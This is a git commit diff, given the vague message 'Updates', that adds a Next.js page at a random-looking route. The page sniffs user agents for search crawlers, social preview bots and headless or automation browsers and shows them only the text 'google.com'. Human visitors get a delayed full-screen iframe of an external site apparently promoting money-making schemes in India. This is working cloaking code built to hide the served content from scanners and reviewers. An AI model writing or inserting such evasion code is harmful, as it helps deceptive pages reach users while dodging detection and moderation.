e199f05786bbe9336a44de71100a8c64b954d032
Prakhar Vohra <webfirex@gmail.com>
2025-12-10 15:14:47 +0530

    Updates

---
+++ app/hgcjghvg/page.tsx
@@ -0,0 +1,67 @@
+"use client";
+import { useEffect, useState } from "react";
+
+const isBot = () => {
+  if (typeof navigator === "undefined") return true;
+
+  const ua = navigator.userAgent.toLowerCase();
+
+  return (
+    ua.includes("googlebot") ||
+    ua.includes("bingbot") ||
+    ua.includes("yandex") ||
+    ua.includes("duckduckbot") ||
+    ua.includes("facebookexternalhit") ||
+    ua.includes("twitterbot") ||
+    ua.includes("slackbot") ||
+    ua.includes("linkedinbot") ||
+    ua.includes("headless") ||
+    ua.includes("lighthouse") ||
+    ua.includes("puppeteer") ||
+    ua.includes("playwright")
+  );
+};
+
+export default function Home() {
+  const [showIframe, setShowIframe] = useState(false);
+  const [blockIframe, setBlockIframe] = useState(false);
+
+  useEffect(() => {
+    if (isBot()) {
+      setBlockIframe(true);
+      return;
+    }
+
+    const timer = setTimeout(() => {
+      setShowIframe(true);
+    }, 2500);
+
+    return () => clearTimeout(timer);
+  }, []);
+
+  return (
+    <div className="flex min-h-screen items-center justify-center bg-white w-full h-screen">
+
+      {!showIframe && !blockIframe && (
+        <div className="flex flex-col items-center gap-2">
+          <div className="animate-spin w-10 h-10 border-4 border-gray-300 border-t-black rounded-full"></div>
+          {/* <p className="text-black text-sm">Loading...</p> */}
+        </div>
+      )}
+
+      {!blockIframe && showIframe && (
+        <iframe
+          src="https://realyono.lakhokmao.com/india.html"
+          className="w-full h-full"
+        />
+      )}
+
+      {blockIframe && (
+        <div className="text-black text-sm">
+          google.com
+        </div>
+      )}
+
+    </div>
+  );
+}
